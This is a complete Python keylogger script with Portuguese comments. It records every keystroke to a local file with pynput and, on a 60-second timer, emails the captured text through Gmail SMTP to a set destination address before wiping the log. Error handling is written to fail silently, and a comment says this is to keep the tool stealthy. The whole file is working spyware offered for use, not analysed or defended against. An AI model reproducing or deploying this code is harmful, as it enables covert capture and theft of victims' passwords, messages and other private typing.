import pynput.keyboard
import threading
import smtplib
import os

# Configurações
EMAIL_USUARIO = "seu_email@gmail.com"
EMAIL_SENHA = "sua_senha_de_app" 
EMAIL_DESTINO = "destino@email.com"
INTERVALO_ENVIO = 60 

class Keylogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.email = email
        self.password = password
        self.nome_arquivo = "log.txt" # Define o nome do arquivo [3]

    def append_to_log(self, string):
        """Grava as teclas diretamente no arquivo log.txt imediatamente [1, 3]."""
        with open(self.nome_arquivo, "a") as f:
            f.write(string)
            f.flush() # Garante que o dado saia do buffer para o disco

    def on_press(self, key):
        """Captura a tecla e trata erros de caracteres especiais [3, 4]."""
        try:
            # Verifica se key.char não é None para evitar o erro visto no seu log [3]
            if key.char is not None:
                current_key = str(key.char)
            else:
                current_key = " [" + str(key) + "] "
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " " + str(key) + " "
        
        self.append_to_log(current_key)

    def enviar_email(self, assunto, corpo):
        """Implementação de envio via SMTP [4]."""
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            mensagem = f"Subject: {assunto}\n\n{corpo}"
            server.sendmail(self.email, EMAIL_DESTINO, mensagem.encode('utf-8'))
            server.quit()
            return True
        except Exception:
            return False # Falha silenciosa para manter a furtividade [4]

    def reportar(self):
        """Lê o log do arquivo, envia e limpa para o próximo ciclo [2]."""
        if os.path.exists(self.nome_arquivo):
            with open(self.nome_arquivo, "r") as f:
                conteudo_log = f.read()

            if conteudo_log:
                if self.enviar_email("Logs Capturados", conteudo_log):
                    # Só limpa o arquivo se o e-mail for enviado com sucesso [2]
                    with open(self.nome_arquivo, "w") as f:
                        f.write("")

        # Agenda a execução recursiva [2]
        timer = threading.Timer(self.interval, self.reportar)
        timer.daemon = True # Garante que o timer feche com o programa principal
        timer.start()

    def iniciar(self):
        """Inicia o processo de monitoramento [2, 5]."""
        self.reportar()
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger(INTERVALO_ENVIO, EMAIL_USUARIO, EMAIL_SENHA)
    keylogger.iniciar()
